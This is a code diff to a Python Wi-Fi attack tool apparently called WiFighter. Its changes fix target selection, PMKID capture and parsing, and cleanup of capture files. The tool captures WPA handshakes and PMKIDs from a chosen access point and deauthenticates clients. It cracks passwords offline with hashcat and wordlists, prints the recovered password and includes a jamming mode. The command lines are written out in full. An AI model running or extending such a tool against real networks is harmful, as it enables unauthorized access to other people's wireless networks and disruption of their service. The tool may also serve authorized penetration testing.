@@ -2,10 +2,9 @@
 
 # | IMPORT | #
 
-import os, sys, subprocess, time, re, multiprocessing
-from multiprocessing import Process, Pipe, Manager
+import os, sys, subprocess, time, re, multiprocessing, psutil
+from multiprocessing import Process, Manager
 from prettytable import PrettyTable 
-import psutil
 from scapy.all import *
 from scapy.all import Dot11
 
@@ -286,7 +285,7 @@ def choose_target():
           while True:     
                try:
                     # Prompt the user to choose an interface by number
-                    choice = int(input(f"\n\nTarget number: "))
+                    choice = int(input(f"\n\nTarget number: ")) - 1
                except ValueError:
                     print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                     continue
@@ -583,7 +582,7 @@ def list_ap(wifi_networks):
      # Create AP table
      table = PrettyTable()
      table.field_names = ["ID", "SSID", "BSSID", "Channel", "Signal (dBm)", "Band", "Encryption", "Auth", "Cipher"]
-     for idx, ap in enumerate(wifi_networks):
+     for idx, ap in enumerate(wifi_networks, start=1):
           table.add_row([
                f"{idx}",
                ap['SSID'] or "N/A",
@@ -824,6 +823,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
                     print(f"{CYAN}[>]{RESET} Handshake/s captured!")
                     captured = True
+                    delete_capture = False
 
           # Periodically deauth                    
           if deauth_mode != 'silent':
@@ -838,7 +838,6 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
 
           time.sleep(2)
 
-     delete_capture = False
      kill_airodump_processes() # Kill all airodump-ng processes
 
      try:
@@ -926,7 +925,10 @@ def pmkid_attack(target_ap, interface, target):
 
      files_after = list_files(output_dir) # Get files after airodump-ng adds new
      output_file = cap_file(files_before, files_after, 'pmkid_capture', '.pcapng') # Determine output_file in which airodump-ng stores
-     file_num = output_file.split('-')[1]
+     try:
+          file_num = output_file.split('-')[1]
+     except:
+          file_num = None
      
      # Wait and verify that handshake was captured successfuly
      captured = False
@@ -935,23 +937,26 @@ def pmkid_attack(target_ap, interface, target):
           if os.path.exists(f"{output_dir}/{output_file}"):
                try:
                     # !! If no EAPOLs caught no pmkid_hash file will be created !!
-                    command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash-{file_num}', f'{output_dir}/{output_file}']
+                    if file_num:
+                         command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash-{file_num}', f'{output_dir}/{output_file}']
+                    else:
+                         command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash', f'{output_dir}/{output_file}']
                     verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                     output = str(verify.communicate())
                except:
                     pass
                # Extract the caught PMKID's number value
-               pmkid_pattern = r'RSN PMKID \(total\).*?: (\d+)'
+               pmkid_pattern = r'RSN PMKID written to 22000 hash file.....:\s+(\d+)'
                pmkid_match = re.search(pmkid_pattern, output) # Search for the pattern in the output string
                if pmkid_match:
                     pmkid = pmkid_match.group(1)
                     if int(pmkid) > 0:
                          print(f"{CYAN}[>]{RESET} PMKID captured!")
                          captured = True
+                         delete_capture = False
 
-          time.sleep(6)
-
-     delete_capture = False
+          time.sleep(4)
+          
      # Kill hcxdumptool process
      capture_pmkid.terminate()
 
@@ -964,7 +969,10 @@ def pmkid_attack(target_ap, interface, target):
      if wordlist:
           try:
                print(f"{CYAN}[>]{RESET} Cracking PMKID with hashcat (CPU) using {wordlist}")
-               command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
+               if file_num:
+                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
+               else:
+                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked.txt']
                crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                output = str(crack.communicate())
 
@@ -975,18 +983,25 @@ def pmkid_attack(target_ap, interface, target):
                     status = status_match.group(1)
                     if status == 'Cracked':
                          # Read the password from the cracked output file
-                         if os.path.exists(f'{output_dir}/pmkid_cracked-{file_num}.txt'):
-                              with open(f'{output_dir}/pmkid_cracked-{file_num}.txt', "r", encoding="utf-8") as file:
+                         if os.path.exists(f'{output_dir}/pmkid_cracked-{file_num}.txt') or os.path.exists(f'{output_dir}/pmkid_cracked.txt'):
+                              if file_num:
+                                   cracked_output = f'{output_dir}/pmkid_cracked-{file_num}.txt'
+                              else:
+                                   cracked_output = f'{output_dir}/pmkid_cracked.txt'
+                              with open(cracked_output, "r", encoding="utf-8") as file:
                                    content = file.read()
                                    password = content.split(':')[-1].strip()
                                    print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
+                                   generate_report('PMKID Attack', target_ap, password, target, output_dir)
           except KeyboardInterrupt:
                pass
      
      if not password or not wordlist:
           print(f"\n{CYAN}[>]{RESET} Password not found...")
-          print(f"{YELLOW}[>]{RESET} PMKID hash available for offline cracking (use hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/pmkid_hash-{file_num}")
-
+          if file_num:
+               print(f"{YELLOW}[>]{RESET} PMKID hash available for offline cracking (use hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/pmkid_hash-{file_num}")
+          else:
+               print(f"{YELLOW}[>]{RESET} PMKID hash available for offline cracking (use hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/pmkid_hash")
 
 
 # | Jamming | #
@@ -1175,14 +1190,27 @@ else:
                     except KeyboardInterrupt:
                          if output_dir and output_file and delete_capture:
                               file_keyword = output_file.split('.')[0]
-                              os.system(f'sudo rm {output_dir}/{file_keyword}*') # Delete all cap files created with airodump
+                              os.system(f'sudo rm {output_dir}/{file_keyword}*') # Delete all cap files created with airodump if handshake not captured
 
           elif attack == 'PMKID Attack':
                try:
                     pmkid_attack(target_ap, interface, target)
                except:
-                    pass
-
+                    if output_dir and output_file and delete_capture:
+                         try:
+                              file_num = output_file.split('-')[1]
+                         except:
+                              file_num = None
+                         if file_num:
+                              os.system(f'sudo rm {output_dir}/pmkid*-{file_num}*') # Delete all files created with hcxtools if PMKID not captured
+                         else:
+                              # Delete all files without number created with hcxtools if PMKID not captured
+                              if os.path.exists(f'{output_dir}/pmkid_capture.pcapng'):
+                                   os.system(f'sudo rm {output_dir}/pmkid_capture.pcapng') 
+                              if os.path.exists(f'{output_dir}/pmkid_hash'):
+                                   os.system(f'sudo rm {output_dir}/pmkid_hash') 
+                              if os.path.exists(f'{output_dir}/pmkid_cracked.txt'):
+                                   os.system(f'sudo rm {output_dir}/pmkid_cracked.txt') 
           elif attack == 'Jamming':
                jammer_mode = choose_jammer_mode()
                if jammer_mode:
@@ -1204,7 +1232,7 @@ else:
      print(f"\n\n{BLUE}Exiting the tool...{RESET}")
      if interface:
           try:
-               monitor_switch(None, 'stop', interface, None)
+               monitor_switch('verbose', 'stop', interface, None)
           except:
                pass
      
